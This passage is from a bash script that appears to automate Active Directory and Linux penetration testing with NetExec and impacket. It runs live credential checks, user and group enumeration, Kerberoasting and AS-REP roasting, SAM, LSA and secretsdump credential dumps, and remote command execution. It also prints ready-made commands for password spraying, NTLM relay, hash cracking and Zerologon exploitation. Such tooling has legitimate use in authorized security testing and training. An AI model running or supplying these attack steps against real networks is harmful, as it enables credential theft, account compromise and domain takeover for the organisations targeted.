        echo -e "\033[96m[+] What you CAN still do:\033[0m"
        echo ""
        echo "# 1. Password Spraying:"
        echo "nxc smb $IP -u users.txt -p 'Password123' --continue-on-success"
        echo "nxc smb $IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success"
        echo ""
        echo "# 2. Kerberoasting (extract and crack service account passwords):"
        echo "nxc ldap $IP -u '$user' -p '$pass' --kerberoasting kerberoast.txt"
        echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt"
        echo ""
        echo "# 3. AS-REP Roasting (accounts without pre-auth):"
        echo "GetNPUsers.py $domain/ -usersfile users.txt -no-pass -dc-ip $IP"
        echo ""
        echo "# 4. Enumerate users for further attacks:"
        echo "nxc smb $IP -u '' -p '' --rid-brute"
        echo "lookupsid.py -no-pass anonymous@$IP"
        echo ""
        echo "# 5. Check for common vulnerabilities:"
        echo "nxc smb $IP -u '$user' -p '$pass' -M zerologon"
        echo "nxc smb $IP -u '$user' -p '$pass' -M petitpotam"
        echo ""
        echo "# 6. LDAP enumeration and attacks:"
        echo "nxc ldap $IP -u '$user' -p '$pass' --bloodhound -c All"
        echo "nxc ldap $IP -u '$user' -p '$pass' --users --admin-count"
        echo ""
    elif echo "$smb_output" | grep -q "signing:False"; then
        echo -e "\n\033[92m[!] SMB Signing is DISABLED - NTLM relay attacks possible!\033[0m"
        echo -e "\033[96m[+] Exploitation suggestions:\033[0m"
        echo "  # NTLM Relay to SMB:"
        echo "  ntlmrelayx.py -tf targets.txt -smb2support"
        echo ""
        echo "  # NTLM Relay to LDAP (for privilege escalation):"
        echo "  ntlmrelayx.py -t ldap://$IP --escalate-user lowpriv"
        echo ""
        echo "  # Capture and relay with Responder:"
        echo "  responder -I eth0 -wv"
        echo "  ntlmrelayx.py -tf targets.txt -smb2support"
        echo ""
    fi
    
    # LDAP requires username (domain optional)
    if [ -n "$user" ]; then
        check_and_suggest ldap nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --timeout 2
    else
        echo -e "\n\033[93m[!] Skipping LDAP check (no username supplied)\033[0m"
    fi
    
    # RDP check (requires username)
    if [ -n "$user" ]; then
        echo -e "\n\033[96m[+] RDP Enumeration:\033[0m"
        echo -e "\n\033[91m[+] RDP Credentials Check\033[0m\n"
        rdp_output=$(check_and_suggest rdp nxc rdp $IP $DOMAIN_FLAG $USER_FLAG)
        echo "$rdp_output"
        
        # Check if RDP access was successful
        if echo "$rdp_output" | grep -q "\[+\]"; then
            echo -e "\n\033[92m[+] RDP access successful! Connect with:\033[0m"
            if [ -n "$domain" ]; then
                echo "xfreerdp3 /v:$IP /u:$domain\\\\$user $XFREERDP_PASS /cert:ignore /clipboard /dynamic-resolution"
            else
                echo "xfreerdp3 /v:$IP /u:$user $XFREERDP_PASS /cert:ignore /clipboard /dynamic-resolution"
            fi
            echo ""
            echo "# Or with rdesktop:"
            echo "rdesktop -u $user -p '$pass' -d $domain $IP"
            echo ""
        fi
    else
        echo -e "\n\033[93m[!] Skipping RDP check (no username supplied)\033[0m"
    fi
fi

# WinRM requires cr
# nxc rdp $IP -u $user -p $pass # RDP
# nxc ftp $IP -u $user -p $pass # FTP

# Skip all Windows-specific enumeration for Linux targets
if [ "$os_type" = "windows" ]; then
    # RPC enumeration - works with username only (null password)
    if [ -n "$user" ]; then
        echo -e "\n\033[96m[+] RPC Enumeration (rpcclient)\033[0m\n"
        rpcclient $RPC_ARG $IP -c "queryuser 0" 2>/dev/null # RPC user query
        rpcclient $RPC_ARG $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
        rpcclient $RPC_ARG $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC
        
        # Extract usernames to a clean list
        if [ -f nxc-enum/smb/rpc-enumdomusers.txt ] && grep -q "user:" nxc-enum/smb/rpc-enumdomusers.txt; then
            # Notify if overwriting existing file
            if [ -f rpcuserlist.txt ]; then
                echo -e "\n\033[93m[!] Overwriting existing rpcuserlist.txt\033[0m"
            fi
            
            grep "user:" nxc-enum/smb/rpc-enumdomusers.txt | awk -F'[][]' '{print $2}' > rpcuserlist.txt
            user_count=$(wc -l < rpcuserlist.txt)
            echo -e "\n\033[92m[+] Extracted $user_count usernames to: rpcuserlist.txt\033[0m"
            echo ""
            echo -e "\033[96m[+] Suggested attacks with this user list:\033[0m"
            echo ""
            echo "# 1. Password spraying with NetExec:"
            echo "nxc smb $IP -u rpcuserlist.txt -p 'Password123' --continue-on-success"
            echo "nxc smb $IP -u rpcuserlist.txt -p passwords.txt --no-bruteforce --continue-on-success"
            echo ""
            echo "# 2. Password spraying with kerbrute:"
            if [ -n "$domain" ]; then
                echo "kerbrute passwordspray -d $domain --dc $IP rpcuserlist.txt 'Password123'"
                echo "kerbrute bruteuser -d $domain --dc $IP passwords.txt username"
                echo ""
                echo "# 3. AS-REP roasting (no password needed):"
                echo "GetNPUsers.py $domain/ -usersfile rpcuserlist.txt -no-pass -dc-ip $IP"
                echo ""
                echo "# 4. Validate usernames with kerbrute:"
                echo "kerbrute userenum -d $domain --dc $IP rpcuserlist.txt"
            else
                echo "kerbrute passwordspray -d DOMAIN --dc $IP rpcuserlist.txt 'Password123'"
                echo ""
                echo "# 3. AS-REP roasting (no password needed):"
                echo "GetNPUsers.py DOMAIN/ -usersfile rpcuserlist.txt -no-pass -dc-ip $IP"
                echo ""
                echo "# Note: Specify domain with -d flag for kerbrute commands"
            fi
            echo ""
        fi
        
        # secretsdump requires actual credentials
        if [ -n "$pass" ] || [ -n "$hash" ]; then
            echo -e "\n\033[96m[+] RPC Secrets Dump (impacket-secretsdump)\033[0m\n"
            impacket-secretsdump $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt # Dump SAM hashes via RPC
        else
            echo -e "\n\033[93m[!] Skipping RPC Secrets Dump (requires password/hash)\033[0m"
        fi
    else
        echo -e "\n\033[93m[!] Skipping RPC Enumeration (no username supplied)\033[0m"
    fi
    
    echo -e "\n\033[96m[+] RPC Endpoint Dump (impacket-rpcdump)\033[0m\n"
    impacket-rpcdump "$IP" $RPCDUMP_ARG 2>/dev/null | tee nxc-enum/smb/rpc-rpcdump.txt # Query RPC endpoint information
    
    if [ -n "$user" ]; then
        echo -e "\n\033[96m[+] WinRM Enumeration:\033[0m"
        echo -e "\n\033[91m[+] WinRM Credentials Check\033[0m\n"
        check_and_suggest winrm nxc winrm $IP $DOMAIN_FLAG $USER_FLAG | tee nxc-enum/smb/winrm-credentials.txt
    
        echo -e "\n\033[91m[+] WinRM Command Execution (whoami)\033[0m\n"
        unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami | tee nxc-enum/smb/winrm-whoami.txt
    else
        echo -e "\n\033[93m[!] Skipping WinRM Enumeration (no username supplied)\033[0m"
    fi
    
    # Redundant share listing removed (already checked in validation)
    # User enumeration removed (already done in initial LDAP domain SID check at line ~100)
    
    if [ -n "$user" ]; then
        echo -e "\n\033[96m[+] Enumerating logged users\033[0m\n"
        unbuffer nxc smb $IP $USER_FLAG --loggedon-users 2>/dev/null | tee nxc-enum/smb/logged-users.txt
    
        echo -e "\n\033[96m[+] Enumerating Admin users\033[0m\n"
        unbuffer nxc ldap $IP $USER_FLAG --users --admin-count 2>/dev/null | tee nxc-enum/ldap/admin-count-users.txt
    
        echo -e "\n\033[96m[+] Enumerating domain users by bruteforcing RID\033[0m\n"
        unbuffer nxc smb $IP $USER_FLAG --rid-brute 2>/dev/null | tee nxc-enum/smb/rid-bruteforce.txt
    
        echo -e "\n\033[96m[+] Enumerating domain groups\033[0m\n"
        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --groups 2>/dev/null | tee nxc-enum/smb/domain-groups.txt
    
        echo -e "\n\033[96m[+] Enumerating local groups\033[0m\n"
        unbuffer nxc smb $IP $USER_FLAG --local-groups 2>/dev/null | tee nxc-enum/smb/local-groups.txt
    
        echo -e "\n\033[96m[+] Dumping password policy\033[0m\n"
        unbuffer nxc smb $IP $USER_FLAG --pass-pol 2>/dev/null | tee nxc-enum/smb/pw-policy.txt
    
        echo -e "\n\033[96m[+] Trying to execute commands:\033[0m\n"
        nxc smb $IP $USER_FLAG -x whoami 2>/dev/null
        nxc smb $IP $USER_FLAG -X '$PSVersionTable' 2>/dev/null
        nxc wmi $IP $USER_FLAG -x whoami 2>/dev/null
        nxc winrm $IP $USER_FLAG -x whoami 2>/dev/null
    else
        echo -e "\n\033[93m[!] Skipping User/Group Enumeration & Command Execution (no username supplied)\033[0m"
    fi
    
    # LDAP modules require actual authentication - skip if no password/hash
    if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
        echo -e "\n\033[91m[+] GMSA Passwords:\033[0m\n"
        unbuffer nxc ldap $IP $USER_FLAG --users --gmsa 2>/dev/null | tee nxc-enum/ldap/gmsa.txt  
    
        echo -e "\n\033[91m[+] Checking Anti Virus:\033[0m\n"
        unbuffer nxc smb $IP $USER_FLAG -M enum_av 2>/dev/null | tee nxc-enum/ldap/anti_virus.txt  
    
        echo -e "\n\033[96m[+] LDAP Module Enumeration:\033[0m"
    
        echo -e "\n\033[91m[+] Machine Account Quota (maq)\033[0m\n"
        unbuffer nxc ldap $IP $USER_FLAG --users -M maq 2>/dev/null | tee nxc-enum/ldap/maq.txt
    
        echo -e "\n\033[91m[+] ADCS Templates\033[0m\n"
        unbuffer nxc ldap $IP $USER_FLAG --users -M adcs 2>/dev/null | tee nxc-enum/ldap/adcs.txt
    
        echo -e "\n\033[91m[+] User Description\033[0m\n"
        unbuffer nxc ldap $IP $USER_FLAG --users -M get-desc-users 2>/dev/null | tee nxc-enum/ldap/desc-users.txt
    
        echo -e "\n\033[91m[+] LDAP Checker\033[0m\n"
        unbuffer nxc ldap $IP $USER_FLAG --users -M ldap-checker 2>/dev/null | tee nxc-enum/ldap/ldap-checker.txt
    
        echo -e "\n\033[91m[+] Password Not Required\033[0m\n"
        unbuffer nxc ldap $IP $USER_FLAG --users --password-not-required 2>/dev/null | tee nxc-enum/ldap/password-not-required.txt
    
        echo -e "\n\033[91m[+] Trusted For Delegation\033[0m\n"
        unbuffer nxc ldap $IP $USER_FLAG --users --trusted-for-delegation 2>/dev/null | tee nxc-enum/ldap/trusted-for-delegation.txt
    
        echo -e "\n\033[91m[+] Kerberoasting\033[0m\n"
        rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
        unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt 2>/dev/null
        if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
            cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
            echo -e "\033[92m[+] Kerberoast hashes found! Saved to kerberoasting.txt\033[0m"
            echo -e "\033[92m[+] Suggested cracking commands:\033[0m"
            
            # Detect hash type and suggest correct mode
            if grep -q 'krb5tgs\$23\$' kerberoasting.txt 2>/dev/null; then
                echo "# etype 23 (RC4-HMAC) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
                echo "hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5tgs\$17\$' kerberoasting.txt 2>/dev/null; then
                echo "# etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
                echo "hashcat -m 19600 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5tgs\$18\$' kerberoasting.txt 2>/dev/null; then
                echo "# etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
                echo "hashcat -m 19700 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            echo ""
        fi
    
        echo -e "\n\033[91m[+] AS-REProasting\033[0m\n"
        rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
        unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt 2>/dev/null
        if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
            cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
            echo -e "\033[92m[+] AS-REP hashes found! Saved to asreproasting.txt\033[0m"
            echo -e "\033[92m[+] Suggested cracking commands:\033[0m"
            
            # Detect hash type and suggest correct mode
            if grep -q 'krb5asrep\$23\$' asreproasting.txt 2>/dev/null; then
                echo "# etype 23 (RC4-HMAC) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
                echo "hashcat -m 18200 asreproasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5asrep\$17\$' asreproasting.txt 2>/dev/null; then
                echo "# etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
                echo "hashcat -m 19800 asreproasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            if grep -q 'krb5asrep\$18\$' asreproasting.txt 2>/dev/null; then
                echo "# etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
                echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
                echo "hashcat -m 19900 asreproasting.txt /usr/share/wordlists/rockyou.txt"
            fi
            echo ""
        fi
    else
        echo -e "\n\033[93m[!] Skipping LDAP Module Enumeration & Roasting (requires username AND password/hash)\033[0m"
    fi
    
    if [ -n "$user" ]; then
        echo -e "\n\033[91m[+] Domain Controllers\033[0m\n"
        unbuffer nxc ldap $IP $USER_FLAG --dc-list | tee nxc-enum/ldap/domain-controllers.txt
    
        echo -e "\n\033[96m[+] SMB Module Enumeration:\033[0m"
    
        echo -e "\n\033[91m[+] Spider Plus (Find Interesting Files)\033[0m\n"
        timeout 60s unbuffer nxc smb $IP $USER_FLAG -M spider_plus --timeout 10 | tee nxc-enum/smb/spider-plus.txt
    
        echo -e "\n\033[91m[+] Check Zerologon Vulnerability\033[0m\n"
        zerologon_output=$(timeout 30s unbuffer nxc smb $IP $USER_FLAG -M zerologon --timeout 5 | tee nxc-enum/smb/zerologon.txt)
        echo "$zerologon_output"
        
        # Check if Zerologon vulnerability was found
        if echo "$zerologon_output" | grep -qi "VULNERABLE\|Exploit\|SUCCESS"; then
            echo -e "\n\033[91m[!!!] CRITICAL: Zerologon vulnerability detected!\033[0m"
            echo -e "\033[93m[!] WARNING: Exploiting Zerologon will break the domain! Only use in authorized testing.\033[0m"
            echo -e "\n\033[92m[+] Suggested exploitation steps:\033[0m"
            
            # Extract DC name if possible
            dc_name=$(echo "$zerologon_output" | grep -oP 'name:\K[^\)]+' | head -n1 | tr -d ' ')
            if [ -z "$dc_name" ]; then
                dc_name="DC_NAME"
            fi
            
            echo "# 1. Exploit Zerologon to reset DC machine account password:"
            echo "python3 /usr/share/doc/python3-impacket/examples/zerologon_tester.py $dc_name $IP"
            echo ""
            echo "# 2. Dump credentials using the zeroed password:"
            echo "impacket-secretsdump -no-pass $dc_name\$@$IP"
            echo ""
            echo "# 3. IMPORTANT: Restore the original password using the hex key from secretsdump:"
            echo "python3 /path/to/restorepassword.py $dc_name $IP -hexpass <HEX_PASSWORD_FROM_SECRETSDUMP>"
            echo ""
            echo -e "\033[91m[!!!] CRITICAL: You MUST restore the password or the domain will be broken!\033[0m"
            echo ""
        fi
    
        echo -e "\n\033[96m[+] MSSQL Enumeration:\033[0m"
    
        echo -e "\n\033[91m[+] MSSQL Info\033[0m\n"
        unbuffer nxc mssql $IP $USER_FLAG | tee nxc-enum/smb/mssql-info.txt
    
        echo -e "\n\033[91m[+] MSSQL Query (xp_dirtree)\033[0m\n"
        unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC xp_dirtree "C:\\", 1;' | tee nxc-enum/smb/mssql-xp-dirtree.txt
    
        echo -e "\n\033[91m[+] MSSQL Query (sp_databases)\033[0m\n"
        unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC sp_databases;' | tee nxc-enum/smb/mssql-databases.txt
        
        echo -e "\n\033[96m[+] VNC Enumeration:\033[0m"
    
        echo -e "\n\033[91m[+] VNC Credentials Check\033[0m\n"
        # VNC doesn't support hash authentication, only password
        if [ -n "$pass" ]; then
            timeout 5s unbuffer nxc vnc $IP -u "$user" -p "$pass" | tee nxc-enum/smb/vnc-credentials.txt
        else
            echo -e "\033[93m[!] Skipping VNC check (VNC requires password, not hash)\033[0m"
        fi
    
        echo -e "\n\033[96m[+] WMI Enumeration:\033[0m"
    
        echo -e "\n\033[91m[+] WMI Credentials Check\033[0m\n"
        check_and_suggest wmi nxc wmi $IP $USER_FLAG | tee nxc-enum/smb/wmi-credentials.txt
    
        echo -e "\n\033[91m[+] WMI Command Execution (whoami)\033[0m\n"
        unbuffer nxc wmi $IP $USER_FLAG -x whoami | tee nxc-enum/smb/wmi-whoami.txt
    
        echo -e "\n\033[96m[+] SMB Additional Enumeration:\033[0m"
    
        echo -e "\n\033[91m[+] SAM Hashes Dump\033[0m\n"
        unbuffer nxc smb $IP $USER_FLAG --sam | tee nxc-enum/smb/sam-hashes.txt
    
        echo -e "\n\033[91m[+] LSA Secrets Dump\033[0m\n"
        unbuffer nxc smb $IP $USER_FLAG --lsa | tee nxc-enum/smb/lsa-secrets.txt
    
        echo -e "\n\033[91m[+] NTDS Database Dump\033[0m\n"
        echo -e "\033[93m[!] Note: NTDS dump can crash DC on Windows Server 2019. Skipping by default.\033[0m"
        echo -e "\033[96m[+] Alternative: Use impacket-secretsdump (already run in RPC section above)\033[0m"
        echo -e "\033[96m[+] Or manually run: nxc smb $IP $USER_FLAG --ntds\033[0m"
        # Auto-answer 'n' to skip the interactive prompt
        # echo 'n' | unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
    else
        echo -e "\n\033[93m[!] Skipping Additional Windows Enumeration (no username supplied)\033[0m"
    fi
else
    echo -e "\n\033[93m[!] Skipping Windows-specific enumeration (target OS: Linux)\033[0m"
    echo -e "\033[96m[+] Linux enumeration mode - focusing on SSH, FTP, and SMB (Samba)\033[0m"
fi

# SSH and FTP enumeration (works for both Windows and Linux)
if [ -n "$user" ]; then
    echo -e "\n\033[96m[+] SSH Enumeration:\033[0m"
    
    echo -e "\n\033[91m[+] SSH Credentials Check\033[0m\n"
    # SSH doesn't support hash authentication
    if [ -n "$pass" ]; then
        ssh_output=$(unbuffer nxc ssh $IP -u "$user" -p "$pass" | tee nxc-enum/smb/ssh-credentials.txt)
        echo "$ssh_output"
        
        # Check if SSH access was successful and suggest connection
        if echo "$ssh_output" | grep -q "\[+\].*Shell access"; then
            echo -e "\n\033[92m[+] SSH access successful! Connect with:\033[0m"
            echo "ssh -o StrictHostKeyChecking=no $user@$IP"
            echo ""
            echo "# Or with password in command (less secure):"
            echo "sshpass -p '$pass' ssh -o StrictHostKeyChecking=no $user@$IP"
            echo ""
            echo "# Copy files from remote:"
            echo "scp -o StrictHostKeyChecking=no $user@$IP:/path/to/file ."
            echo ""
            echo "# Copy files to remote:"
            echo "scp -o StrictHostKeyChecking=no localfile $user@$IP:/path/to/destination"
            echo ""
        fi
    else
        echo -e "\033[93m[!] Skipping SSH check (SSH requires password, not hash)\033[0m"
    fi

    echo -e "\n\033[91m[+] SSH Command Execution (whoami)\033[0m\n"
    if [ -n "$pass" ]; then
        unbuffer nxc ssh $IP -u "$user" -p "$pass" -x "whoami" | tee nxc-enum/smb/ssh-whoami.txt
    else
        echo -e "\033[93m[!] Skipping (SSH requires password)\033[0m"
    fi
    
    echo -e "\n\033[96m[+] FTP Enumeration:\033[0m"
    
    echo -e "\n\033[91m[+] FTP Credentials Check\033[0m\n"
    # FTP doesn't support hash authentication
    if [ -n "$pass" ]; then
        timeout 5s unbuffer nxc ftp $IP -u "$user" -p "$pass" | tee nxc-enum/smb/ftp-credentials.txt
    else
        echo -e "\033[93m[!] Skipping FTP check (FTP requires password, not hash)\033[0m"
    fi
    
    echo -e "\n\033[91m[+] FTP Share Enumeration\033[0m\n"
    if [ -n "$pass" ]; then
        timeout 5s unbuffer nxc ftp $IP -u "$user" -p "$pass" --ls | tee nxc-enum/smb/ftp-shares.txt
    else
        echo -e "\033[93m[!] Skipping (FTP requires password)\033[0m"
    fi
else
    echo -e "\n\033[93m[!] Skipping SSH/FTP Enumeration (no username supplied)\033[0m"
fi

# Advanced DACL enumeration (requires credentials)
if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
    echo -e "\n\033[96m[+] Advanced DACL Enumeration:\033[0m"
    
    echo -e "\n\033[91m[+] Administrator's ACE\033[0m\n"
    unbuffer nxc ldap $IP $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read 2>/dev/null | tee nxc-enum/ldap/admin-ace.txt
    
    # Build domain DN from domain name
    if [ -n "$domain" ]; then
        # Convert domain.local to DC=domain,DC=local
        domain_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
        
        echo -e "\n\033[91m[+] DCSync Rights\033[0m\n"
        unbuffer nxc ldap $IP $USER_FLAG -M daclread -o TARGET_DN="$domain_dn" ACTION=read RIGHTS=DCSync 2>/dev/null | tee nxc-enum/ldap/dcsync-rights.txt
        
        echo -e "\n\033[96m[+] What these checks reveal:\033[0m"
        echo "  - Administrator ACE: Shows who can modify the Administrator account"
        echo "  - DCSync Rights: Shows who can dump domain credentials (critical finding!)"
        echo ""
    else
        echo -e "\n\033[93m[!] Skipping DCSync rights check (no domain name provided)\033[0m"
    fi
fi